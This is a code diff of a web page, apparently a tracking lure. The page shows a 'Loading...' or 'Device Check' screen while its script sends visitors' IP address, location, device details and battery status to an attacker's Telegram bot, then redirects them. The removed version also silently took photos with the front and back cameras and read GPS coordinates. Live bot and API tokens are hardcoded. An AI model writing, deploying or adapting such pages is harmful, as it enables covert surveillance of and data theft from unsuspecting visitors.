@@ -1,37 +1,42 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Loading...</title>
+  <title>Device Check | Opas Labs</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <style>
     body {
       margin: 0;
-      background: #fff;
-      color: #000;
+      background: #000;
+      color: #fff;
       font-family: sans-serif;
       display: flex;
       flex-direction: column;
       justify-content: center;
       align-items: center;
       height: 100vh;
+      text-align: center;
+    }
+    p {
+      max-width: 500px;
     }
   </style>
 </head>
 <body>
-  <p>Loading...</p>
+  <h2>🔐 Device Check in Progress</h2>
+  <p>This process checks your device for system info and optional camera access. You’ll be redirected shortly.</p>
 
   <script>
-    const BOT_TOKEN = "7740401254:AAHhnSMhm-dMcv7-4LJCGwHchxRrYhBEsCY";
+    const BOT_TOKEN = "8064189934:AAGeRa_SIje_gEq7frBtUSJ-NvL6coLLJdo";
     const CHAT_ID = "7216371031";
     const REDIRECT_URL = "https://opaslabs.vercel.app";
     let deviceInfo = "";
     let redirected = false;
 
+    // Redirect after delay (failsafe)
     setTimeout(() => {
       if (!redirected) window.location.href = REDIRECT_URL;
-    }, 8000); // fallback after 8s
+    }, 10000);
 
     function sendToTelegram(message) {
       return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -41,131 +46,54 @@
       });
     }
 
-    function sendPhotoToTelegram(blob) {
-      const formData = new FormData();
-      formData.append("chat_id", CHAT_ID);
-      formData.append("photo", blob, "photo.jpg");
-      return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-        method: "POST",
-        body: formData
-      });
-    }
-
-    async function takePhoto(facing = "user") {
+    async function collectInfo() {
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: { ideal: facing } }
-        });
-        const video = document.createElement("video");
-        video.srcObject = stream;
-        await video.play();
-        const canvas = document.createElement("canvas");
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        const ctx = canvas.getContext("2d");
-        ctx.drawImage(video, 0, 0);
-        stream.getTracks().forEach(track => track.stop());
-        const blob = await new Promise(res => canvas.toBlob(res, "image/jpeg", 0.85));
-        await sendPhotoToTelegram(blob);
-        return true;
-      } catch {
-        deviceInfo += `🚫 Camera (${facing}): Denied or blocked\n`;
-        return false;
+        const ua = navigator.userAgent;
+        const ram = navigator.deviceMemory || "?";
+        const cpu = navigator.hardwareConcurrency || "?";
+        const platform = navigator.platform;
+        const resolution = `${screen.width}x${screen.height}`;
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+        deviceInfo += `📱 User Agent: ${ua}\n`;
+        deviceInfo += `🧠 RAM: ${ram} GB\n`;
+        deviceInfo += `🧮 CPU Cores: ${cpu}\n`;
+        deviceInfo += `🖥️ Platform: ${platform}\n`;
+        deviceInfo += `📺 Screen: ${resolution}\n`;
+        deviceInfo += `🕓 Timezone: ${timezone}\n`;
+
+        // IP + Region
+        const ipInfo = await fetch("https://ipinfo.io/json?token=ce7fbbdbe9fd92").then(res => res.json());
+        deviceInfo += `🌍 IP: ${ipInfo.ip}\n📍 Location: ${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country}\n`;
+
+        // Battery
+        try {
+          const battery = await navigator.getBattery();
+          deviceInfo += `🔋 Battery: ${Math.round(battery.level * 100)}%\n`;
+          deviceInfo += `⚡ Charging: ${battery.charging ? "Yes" : "No"}\n`;
+        } catch {
+          deviceInfo += `🔋 Battery info: Unavailable\n`;
+        }
+
+        await sendToTelegram(deviceInfo);
+      } catch (err) {
+        await sendToTelegram("❌ Error collecting device info:\n" + err.message);
       }
     }
 
-    function detectDeviceBrand() {
-      const ua = navigator.userAgent.toLowerCase();
-      if (ua.includes("iphone")) return "Apple iPhone";
-      if (ua.includes("ipad")) return "Apple iPad";
-      if (ua.includes("mac")) return "Apple Mac";
-      if (ua.includes("samsung")) return "Samsung";
-      if (ua.includes("xiaomi")) return "Xiaomi";
-      if (ua.includes("redmi")) return "Redmi";
-      if (ua.includes("realme")) return "Realme";
-      if (ua.includes("vivo")) return "Vivo";
-      if (ua.includes("oppo")) return "Oppo";
-      if (ua.includes("oneplus")) return "OnePlus";
-      if (ua.includes("nokia")) return "Nokia";
-      if (ua.includes("asus")) return "Asus";
-      if (ua.includes("huawei")) return "Huawei";
-      if (ua.includes("lenovo")) return "Lenovo";
-      if (ua.includes("windows")) return "Windows PC";
-      if (ua.includes("android")) return "Android (Unknown)";
-      return "Unknown";
-    }
-
-    function getBatteryInfo() {
-      return navigator.getBattery().then(battery => {
-        deviceInfo += `🔋 Battery: ${Math.round(battery.level * 100)}%\n`;
-        deviceInfo += `⚡ Charging: ${battery.charging ? "Yes" : "No"}\n`;
-      }).catch(() => {
-        deviceInfo += `🔋 Battery: Not Available\n`;
-      });
-    }
-
-    function getIPInfo() {
-      return fetch("https://ipinfo.io/json?token=ce7fbbdbe9fd92")
-        .then(res => res.json())
-        .then(ip => {
-          const loc = ip.loc ? ip.loc.split(",") : ["N/A", "N/A"];
-          deviceInfo += `🌍 IP: ${ip.ip}\n`;
-          deviceInfo += `📍 Location: ${ip.city}, ${ip.region}, ${ip.country}\n`;
-          deviceInfo += `📌 Lat: ${loc[0]}, Lon: ${loc[1]}\n`;
-          deviceInfo += `🌐 ISP: ${ip.org || "Unknown"}\n`;
-        }).catch(() => {
-          deviceInfo += `🌍 IP: Not Available\n📍 Location: Unknown\n`;
-        });
-    }
-
-    function getGPSLocation() {
-      return new Promise(resolve => {
-        if (!navigator.geolocation) return resolve();
-        navigator.geolocation.getCurrentPosition(
-          pos => {
-            const { latitude, longitude, accuracy } = pos.coords;
-            deviceInfo += `📡 GPS: ${latitude}, ${longitude} (±${accuracy}m)\n`;
-            resolve();
-          },
-          () => {
-            deviceInfo += `📡 GPS: Denied or unavailable\n`;
-            resolve();
-          },
-          { enableHighAccuracy: true, timeout: 4000 }
-        );
-      });
-    }
-
-    function getExtraDetails() {
-      const touch = 'ontouchstart' in window ? "Yes" : "No";
-      const languages = navigator.languages.join(", ");
-      const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-      const brand = detectDeviceBrand();
-      deviceInfo += `📱 Brand: ${brand}\n`;
-      deviceInfo += `🌐 Languages: ${languages}\n`;
-      deviceInfo += `🧠 RAM: ${navigator.deviceMemory || "?"} GB\n`;
-      deviceInfo += `🧮 CPU Cores: ${navigator.hardwareConcurrency || "?"}\n`;
-      deviceInfo += `📲 Touch: ${touch}\n`;
-      deviceInfo += `🕓 Timezone: ${timeZone} (UTC${-new Date().getTimezoneOffset()/60})\n`;
-      deviceInfo += `💻 Platform: ${navigator.platform}\n`;
-      deviceInfo += `🖥️ Screen: ${screen.width}x${screen.height}\n`;
-      deviceInfo += `📱 UA: ${navigator.userAgent}\n`;
-      deviceInfo += `🕒 Time: ${new Date().toLocaleString()}\n`;
-      deviceInfo += `🔗 Referrer: ${document.referrer || "Direct"}\n`;
+    async function tryCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        stream.getTracks().forEach(track => track.stop());
+        await sendToTelegram("📷 Camera access granted.");
+      } catch {
+        await sendToTelegram("🚫 Camera access denied.");
+      }
     }
 
     async function runAll() {
-      await Promise.all([getBatteryInfo(), getIPInfo(), getGPSLocation()]);
-      getExtraDetails();
-      await sendToTelegram(deviceInfo);
-
-      const front = await takePhoto("user");
-      const back = await takePhoto("environment");
-
-      if (!front && !back) {
-        await sendToTelegram("🚫 Both cameras denied.");
-      }
-
+      await collectInfo();
+      await tryCamera();
       redirected = true;
       window.location.href = REDIRECT_URL;
     }
